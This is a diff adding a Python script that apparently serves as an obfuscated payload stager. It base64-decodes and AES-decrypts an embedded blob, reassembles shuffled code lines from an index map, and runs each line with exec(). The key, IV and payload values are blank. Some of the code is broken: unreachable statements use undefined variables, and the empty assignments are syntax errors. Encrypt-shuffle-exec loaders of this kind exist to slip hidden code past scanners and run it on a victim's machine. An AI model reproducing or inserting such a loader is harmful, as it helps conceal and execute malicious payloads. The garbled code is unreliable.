@@ -1,0 +1,81 @@
+
+import Crypto,base64
+from Crypto.Cipher import AES
+from base64 import b64decode, b64encode
+
+def ddc(pld,key,iv):
+    obj3 = AES.new(key,AES.MODE_CFB,iv)
+    cd = obj3.decrypt(pld)
+
+    return cd
+def exddc(pld,key,iv):
+    cP = pld
+    out = b64decode(cP)
+    x = ddc(out,key,iv)
+    return x
+def rcnLn(shfLn,arrMap):
+    cmd=""
+    
+#print red("DEBUG: function=rcnLn(shfLn,arrMap) Shuffled Line to Reconstitute\r\n{}".format(shfLn))
+    
+#print yellow("DEBUG: function=rcnLn(shfLn,arrMap) arrMap to reconstitute the payload\r\n{}".format(arrMap))
+    for indice in arrMap:
+        cmd = "{}{}".format(str(cmd),str(shfLn[indice]))
+    
+#print green("DEBUG: function=rcnLn(shfLn,arrMap) Reconstituted Command:\r\n{}".format(str(cmd)))
+
+    return cmd
+
+    
+#print red("DEBUG: function=rcnPld(Shuffled payload)"),yellow(sP)
+    
+#print yellow("DEBUG: type(sP)={}".format(str(type(sP))))
+    for key in sP:
+        key = int(key)
+        cmd = ""
+        
+#print red("DEBUG: function=rcnPld(Shuffled payload) key"),red(key)
+        cmd = rcnLn(shfLn,arrMap)
+        exec(cmd)
+        
+#print "DEBUG: function=rcnPld(Shuffled payload) Executed python command\r\n{}".format(str(cmd))
+    return
+    
+def rcnPld(shfPld):
+    exec(shfPld)
+    for key in shfPld:
+        key = int(key)
+        cmd = ""
+        shfLn = shfPld[key][0]
+        
+# First you need to reexecut each line of the dict object to have it initialize as a proper dictionary
+         
+# key being the dictionary object of the scrambled payload line
+        arrMap = shfPld[key][1] 
+# value being the arrMap
+        cmd = rcnLn(shfLn,arrMap)
+        exec(cmd)
+        
+#print "DEBUG: Executed python command\r\n{}".format(str(cmd))
+    return
+
+key=
+iv=
+pld=
+
+def mn(xc=pld):
+    cd=xc
+    sP = exddc(cd,key,iv)
+    
+# 
+#print red("DEBUG: function=mn(xc=pld) Shuffled Payload Type\r\n"),red(type(sP))
+    
+#print red("DEBUG: function=mn(xc=pld) Shuffled Payload Type\r\n"),red(type(sP))
+    
+#print yellow("DEBUG: function=mn Contents of ShuffledPayload\r\n{}".format(str(sP)))
+    nS = "shfPld={}".format(str(sP))
+    
+#print yellow("DEBUG: function=mn nS\r\n{}".format(str(nS)))
+    rcnPld(nS)
+    return
+mn()
